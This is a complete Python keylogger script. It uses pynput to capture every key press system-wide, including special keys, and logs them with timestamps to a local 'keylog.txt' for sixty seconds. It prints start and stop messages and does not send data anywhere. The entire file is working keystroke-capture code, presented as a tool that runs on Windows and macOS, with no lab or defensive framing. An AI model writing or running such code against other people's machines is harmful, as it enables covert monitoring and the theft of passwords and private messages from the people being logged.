import pynput
from pynput.keyboard import Key, Listener
import logging
import time # Import the time module

# Configure logging to save keystrokes to a file
# The file 'keylog.txt' will be created in the same directory as the script.
# This setup works on both Windows and macOS.
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define the duration for the keylogger to run (in seconds)
RUN_DURATION_SECONDS = 60 # 1 minute

def on_press(key):
    """
    This function is called when a key is pressed.
    It logs the key press to the 'keylog.txt' file.
    Special keys like Space, Enter, Shift, etc., are explicitly named.
    """
    try:
        logging.info(str(key.char))
    except AttributeError:
        # Handle special keys (e.g., Space, Enter, Shift)
        if key == Key.space:
            logging.info(" ")
        elif key == Key.enter:
            logging.info("\n")
        else:
            logging.info(str(key))

# The on_release function is no longer needed to stop the logger,
# as it will now stop automatically after a set duration.
# However, we keep a minimal on_release to satisfy the Listener's requirement,
# or for potential future use (e.g., custom stop conditions based on release).
def on_release(key):
    """
    This function is called when a key is released.
    It currently does not contain logic to stop the keylogger,
    as the script is designed to stop after a defined duration.
    """
    pass # No action needed on key release for automatic timeout


print(f"Keylogger started. It will run for {RUN_DURATION_SECONDS} seconds.")
print("Keystrokes will be logged to 'keylog.txt'.")

# Set up the listener for keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    # Join the listener thread to the main thread with a timeout.
    # After the timeout, the main thread will continue, and the 'with' block
    # will implicitly stop the listener.
    listener.join(timeout=RUN_DURATION_SECONDS)

print("Keylogger stopped after the specified duration.")
